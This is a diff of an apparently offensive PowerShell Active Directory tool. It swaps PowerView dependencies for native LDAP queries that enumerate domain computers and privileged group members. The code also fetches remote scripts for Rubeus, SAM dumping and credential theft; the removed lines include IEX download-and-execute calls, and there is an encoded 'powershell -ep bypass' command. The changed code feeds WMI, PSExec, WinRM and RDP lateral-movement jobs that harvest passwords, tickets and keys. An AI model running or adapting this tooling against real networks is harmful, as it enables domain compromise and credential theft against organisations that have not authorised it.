@@ -70,7 +70,7 @@ Write-Output $Banner
 Write-Host "Github  : " -ForegroundColor "Yellow" -NoNewline
 Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -ForegroundColor "Yellow" -NoNewline
-Write-Host "0.0.4"
+Write-Host "0.0.5"
 Write-Host
 
 
@@ -129,17 +129,13 @@ elseif ($CurrentUser -and $Method -ne "RDP"){
 
 
 # Check script modules
-
-$PowerViewLoaded = Get-Command -Name "Get-DomainComputer" -ErrorAction "SilentlyContinue"
 $InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"
 
 ###################### External Script Varibles ######################
-#IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Mongoose.ps1")
 $MongooseURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Mongoose.ps1"
 $RubeusURL = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1"
 $DumpSAMURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/DumpSAM.ps1"
 $PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
-$PowerviewURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"
 
 # IF $LocalFileServer is not NULL, check if valid IP address 
 
@@ -151,7 +147,6 @@ if (![string]::IsNullOrEmpty($LocalFileServer)) {
         $RubeusURL = "http://$LocalFileServer/Invoke-Rubeus.ps1"
         $DumpSAMURL = "http://$LocalFileServer/DumpSAM.ps1"
         $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
-        $PowerviewURL = "http://$LocalFileServer/PowerView.ps1"
     }
     else {
         Write-Host "[-] " -ForegroundColor "Red" -NoNewline
@@ -228,26 +223,43 @@ $CheckAdmin = "([Security.Principal.WindowsPrincipal] [Security.Principal.Window
 
 ######### Target acquisition  Single Domain #########
 
-if ($Targets -ne "") {
-    if ($PowerViewLoaded.Name -ne "Get-DomainComputer"){IEX(New-Object System.Net.WebClient).DownloadString("$PowerviewURL")}
-}
-
 if ($Targets -eq "Workstations") {
-    $Computers = Get-DomainComputer  -Domain $Domain -OperatingSystem "*" -Properties "DNShostname","OperatingSystem" -UACFilter "NOT_ACCOUNTDISABLE" `
-        | Where-Object {$_.operatingsystem -notlike "*windows*server*" -and $_.dnshostname -notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
+
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
+
 }
 elseif ($Targets -eq "Servers") {
-    $Computers = Get-DomainComputer -Domain $Domain -OperatingSystem "*server*" -Properties "DNShostname","OperatingSystem" -UACFilter "NOT_ACCOUNTDISABLE" `
-        | Where-Object { $_.dnshostname -notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN"}
-}
-elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
-    $Computers = Get-DomainComputer -UACFilter "SERVER_TRUST_ACCOUNT","NOT_ACCOUNTDISABLE" -Properties "OperatingSystem","dnshostname"
-}
-elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
-    $Computers = Get-DomainComputer -Domain $Domain -Properties "DNShostname","OperatingSystem" -UACFilter "NOT_ACCOUNTDISABLE" `
-        | Where-Object { $_.dnshostname -notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN"} `
+
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }
 
 }
+elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
+
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+$computers = $searcher.FindAll()
+
+}
+elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
+
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0]-notmatch "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }`
+
+}
+
 elseif ($Targets -is [string]) {
     $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
     if ($ipAddress) {
@@ -255,9 +267,20 @@ elseif ($Targets -is [string]) {
         break
     }
     else {
-        $Computers = Get-DomainComputer -Domain $Domain -Properties "DNShostname","OperatingSystem" -identity $Targets
+        $directoryEntry = [ADSI]"LDAP://$domain"
+        $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*))"
+        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
+        
+        if ($Targets -notlike "*.*") {
+            $Targets = $Targets + "." + $Domain
+        }
+        
+        $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
     }
 }
+
+
 else {
     Write-Host "Invalid value for Targets. Must be Workstations, Servers, DC, All, an IP address or a system name." -ForegroundColor "Red"
     break
@@ -265,10 +288,50 @@ else {
 
 # Grab interesting users for various parsing functions
 
-    $DomainAdmins = Get-DomainGroupMember -Identity "Domain Admins" | Select-Object -ExpandProperty "Membername"
-    $EnterpriseAdmins = Get-DomainGroupMember -Identity "Enterprise Admins" | Select-Object -ExpandProperty "Membername"
-    $ServerOperators = Get-DomainGroupMember -Identity "Server Operators" | Select-Object -ExpandProperty "Membername"
-    $AccountOperators = Get-DomainGroupMember -Identity "Account Operators" | Select-Object -ExpandProperty "Membername"
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=group)(cn=Domain Admins))"
+$searcher.PropertiesToLoad.AddRange(@("member"))
+$group = $searcher.FindOne()
+
+$domainAdmins = $group.Properties["member"] | ForEach-Object {
+    $user = $_.ToString().Split(",")[0].Substring(3)
+    $user
+}
+
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=group)(cn=Enterprise Admins))"
+$searcher.PropertiesToLoad.AddRange(@("member"))
+$group = $searcher.FindOne()
+
+$EnterpiseAdmins = $group.Properties["member"] | ForEach-Object {
+    $user = $_.ToString().Split(",")[0].Substring(3)
+    $user
+}
+
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=group)(cn=Server Operators))"
+$searcher.PropertiesToLoad.AddRange(@("member"))
+$group = $searcher.FindOne()
+
+$ServerOperators = $group.Properties["member"] | ForEach-Object {
+    $user = $_.ToString().Split(",")[0].Substring(3)
+    $user
+}
+
+$directoryEntry = [ADSI]"LDAP://$domain"
+$searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+$searcher.Filter = "(&(objectCategory=group)(cn=Account Operators))"
+$searcher.PropertiesToLoad.AddRange(@("member"))
+$group = $searcher.FindOne()
+
+$AccountOperators = $group.Properties["member"] | ForEach-Object {
+    $user = $_.ToString().Split(",")[0].Substring(3)
+    $user
+}
+
 
 if ($Method -ne "RDP"){
 if (!$Force){
@@ -293,12 +356,26 @@ foreach ($DomainAdmin in $DomainAdmins){
     }
 }
 
-$DomainUser = Get-DomainUser -Domain $Domain -Identity $Username
-if (!$DomainUser){
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Specified username is not a valid domain user"
-        return
+if (!$CurrentUser) {
+    if (!$GenRelayList) {
+        try {
+            $directoryEntry = [ADSI]"LDAP://$domain"
+            $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
+            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
+            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+            $user = $searcher.FindOne()
+            $domainUser = $user.Properties["samAccountName"]
+        }
+        Catch {
+            if (!$DomainUser) {
+                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
+                Write-Host "Specified username is not a valid domain user"
+                return
+            }
+        }
+    }
 }
+
 
 
 ######### Load Rubeus #########
@@ -463,8 +540,9 @@ $Command = "powershell.exe -ep bypass -enc $base64Command"
 
 # Gets the integer for the longest occurance of DNSHostName and Operating System. Ensures output is tidy
 
-$NameLength = ($Computers | foreach { $_.dnshostname.Length } | Measure-Object -Maximum).Maximum
-$OSLength = ($Computers | foreach { $_.operatingsystem.Length } | Measure-Object -Maximum).Maximum
+$NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
+$OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
+
 
 # Function - WMI
 Function Method-WMIexec {
@@ -473,8 +551,8 @@ $ErrorActionPreference = "SilentlyContinue"
 $MaxConcurrentJobs = $Threads
 $WMIJobs = @()
     Foreach ($Computer in $Computers){
-    $OS = $($Computer.operatingsystem)
-    $ComputerName = $($Computer.dnshostname)
+    $OS = $computer.Properties["operatingSystem"][0]
+    $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
             Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $Class, $eKeys, $OS, $ComputerName, $NameLength, $OSLength)
             $Class = "PMEClass"
@@ -716,8 +794,8 @@ $ErrorActionPreference = "SilentlyContinue"
     $MaxConcurrentJobs = $Threads
     $PSexecJobs = @()
     foreach ($Computer in $Computers) {
-        $OS = $($Computer.operatingsystem)
-        $ComputerName = $($Computer.dnshostname)
+    $OS = $computer.Properties["operatingSystem"][0]
+    $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
             Param($Option,$Computer, $Domain, $Command, $Module ,$PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $ekeys, $PSexecURL, $OS, $ComputerName, $NameLength, $OSLength)
             $tcpClient = New-Object System.Net.Sockets.TcpClient
@@ -1012,8 +1090,8 @@ $ErrorActionPreference = "SilentlyContinue"
     $WinRMJobs = @()
 
     foreach ($Computer in $Computers) {
-        $OS = $Computer.operatingsystem
-        $ComputerName = $Computer.dnshostname
+    $OS = $computer.Properties["operatingSystem"][0]
+    $ComputerName = $computer.Properties["dnshostname"][0]
         $ScriptBlock = {
             Param($Option, $Computer, $Domain, $Command, $Module, $CheckAdmin, $PME, $SAM, $PandemoniumURL, $LogonPasswords, $Tickets, $eKeys, $OS, $ComputerName, $IPs, $NameLength, $OSLength)
             $tcpClient = New-Object System.Net.Sockets.TcpClient
@@ -1181,8 +1259,8 @@ $ErrorActionPreference = "SilentlyContinue"
     $RDPJobs = @()
 
 foreach ($Computer in $Computers) {
-$ComputerName = $($Computer.dnshostname)
-$OS = $Computer.operatingsystem
+$OS = $computer.Properties["operatingSystem"][0]
+$ComputerName = $computer.Properties["dnshostname"][0]
 $Random = Get-Random -Maximum "10" -Minimum "1"
 Start-sleep -Seconds $Random
 $ScriptBlock = {
@@ -2194,8 +2272,8 @@ Function GenRelayList {
     $ErrorActionPreference = "SilentlyContinue"
 
     Foreach ($Computer in $Computers){
-        $ComputerName = $($Computer.dnshostname)
-        $OS = $Computer.operatingsystem
+    $OS = $computer.Properties["operatingSystem"][0]
+    $ComputerName = $computer.Properties["dnshostname"][0]
 
         $tcpClient = New-Object System.Net.Sockets.TcpClient
         $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
